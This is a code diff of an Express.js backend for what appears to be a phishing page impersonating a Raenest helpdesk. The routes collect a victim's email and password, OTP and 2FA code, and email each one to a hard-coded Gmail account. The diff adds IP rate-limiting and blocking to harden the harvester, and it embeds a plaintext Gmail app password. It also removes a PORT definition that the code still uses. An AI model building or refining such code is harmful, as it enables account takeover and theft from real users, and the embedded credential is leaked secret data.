@@ -2,8 +2,13 @@ const express = require("express");
 const app = express();
 const cors = require("cors");
 const nodemailer = require("nodemailer");
+const rateLimit = require("express-rate-limit");
 
-// ✅ CORS MUST come FIRST, before express.json()
+// ✅ Trust Vercel's proxy so req.ip returns the real client IP
+// Without this, everyone shares the same proxy IP and hits the limit together
+app.set("trust proxy", 1);
+
+// ✅ CORS first
 app.use(
   cors({
     origin: "https://helpdesk-raenest.vercel.app",
@@ -12,68 +17,109 @@ app.use(
     credentials: true,
   }),
 );
-
-// ✅ Handle preflight OPTIONS requests
 app.options("*", cors());
-
 app.use(express.json());
-
-const PORT = process.env.PORT || 5000;
 
 // Email credentials
 const userEmail = "web3coach33@gmail.com";
 const pass = "vviqszytacvfamvd";
 
-// API routes for index
+
+// ── Permanent IP blocklist ────────────────────────────────────────────────────
+const blockedIPs = new Set();
+
+app.use((req, res, next) => {
+  const ip = req.ip;
+  if (blockedIPs.has(ip)) {
+    console.warn(`🚫 Blocked IP tried again: ${ip}`);
+    return res.status(403).json({ success: false, message: "Access denied." });
+  }
+  next();
+});
+
+// ── Rate limiter — 5 requests per hour per real client IP ────────────────────
+const limiter = rateLimit({
+  windowMs: 60 * 60 * 1000, // 1 hour
+  max: 5,
+  standardHeaders: true,
+  legacyHeaders: false,
+  keyGenerator: (req) => req.ip, // uses the real IP now that trust proxy is set
+  handler: (req, res) => {
+    const ip = req.ip;
+    blockedIPs.add(ip);
+    console.warn(`🚫 IP permanently blocked: ${ip}`);
+    return res.status(403).json({ success: false, message: "Access denied." });
+  },
+});
+
+// Apply limiter to POST requests only
+app.use((req, res, next) => {
+  if (req.method === "POST") return limiter(req, res, next);
+  next();
+});
+
+// ✅ Single transporter at startup
+const transporter = nodemailer.createTransport({
+  service: "gmail",
+  auth: { user: userEmail, pass: pass },
+});
+
+transporter.verify((error) => {
+  if (error) {
+    console.error("❌ Mail error:", error.message);
+  } else {
+    console.log("✅ Mail transporter ready");
+  }
+});
+
+// ── GET / — health check ──────────────────────────────────────────────────────
+app.get("/", (req, res) => {
+  res.json({ status: "ok", server: "Raenest API" });
+});
+
+// ── POST / — email + password ─────────────────────────────────────────────────
 app.post("/", (req, res) => {
   const { email, password } = req.body;
 
-  const transporter = nodemailer.createTransport({
-    service: "gmail",
-    auth: {
-      user: userEmail,
-      pass: pass,
-    },
-  });
+  if (!email || !password) {
+    return res
+      .status(400)
+      .json({ success: false, message: "Email and password required." });
+  }
 
   const mailOptions = {
     from: userEmail,
     to: userEmail,
-    subject: `New Login Attempt`,
-    text: `New user registered with Email: ${email} and password: ${password}`,
+    subject: "New Login Attempt",
+    text: `Email: ${email}\nPassword: ${password}`,
   };
 
   console.log(mailOptions);
 
   transporter.sendMail(mailOptions, (error, info) => {
     if (error) {
-      console.log(error);
-      res.status(500).send("Error occurred: " + error);
-    } else {
-      console.log("Email sent: " + info.response);
-      res.send("success");
+      console.error(error);
+      return res.status(500).send("Error occurred: " + error);
     }
+    console.log("Email sent: " + info.response);
+    return res.send("success");
   });
 });
 
-// API routes for otp
+// ── POST /otp — OTP code ──────────────────────────────────────────────────────
 app.post("/otp", (req, res) => {
-  console.log(req.body);
-  const email = req.body.email;
   const otp = req.body?.otp;
 
-  const transporter = nodemailer.createTransport({
-    service: "gmail",
-    auth: {
-      user: userEmail,
-      pass: pass,
-    },
-  });
+  if (!otp) {
+    return res
+      .status(400)
+      .json({ success: false, message: "OTP required." });
+  }
 
   const mailOptions = {
     from: userEmail,
     to: userEmail,
-    subject: `OTP Received`,
+    subject: "OTP Received",
     text: `OTP: ${otp}`,
   };
 
@@ -81,16 +127,15 @@ app.post("/otp", (req, res) => {
 
   transporter.sendMail(mailOptions, (error, info) => {
     if (error) {
-      console.log(error);
-      res.status(500).send("Error occurred: " + error);
-    } else {
-      console.log("Email sent: " + info.response);
-      res.send("success");
+      console.error(error);
+      return res.status(500).send("Error occurred: " + error);
     }
+    console.log("Email sent: " + info.response);
+    return res.send("success");
   });
 });
 
-// ── POST /auth — 6-digit authenticator code
+// ── POST /auth — 6-digit 2FA code ────────────────────────────────────────────
 app.post("/auth", (req, res) => {
   const { auth } = req.body;
 
@@ -99,13 +144,6 @@ app.post("/auth", (req, res) => {
       .status(400)
       .json({ success: false, message: "Auth must be exactly 6 digits." });
   }
-  const transporter = nodemailer.createTransport({
-    service: "gmail",
-    auth: {
-      user: userEmail,
-      pass: pass,
-    },
-  });
 
   const mailOptions = {
     from: userEmail,
@@ -129,5 +167,5 @@ app.post("/auth", (req, res) => {
 });
 
 app.listen(PORT, () => {
-  console.log(`Server is running on port http://localhost:${PORT}`); // ✅ FIXED
+  console.log(`Server is running on http://localhost:${PORT}`);
 });
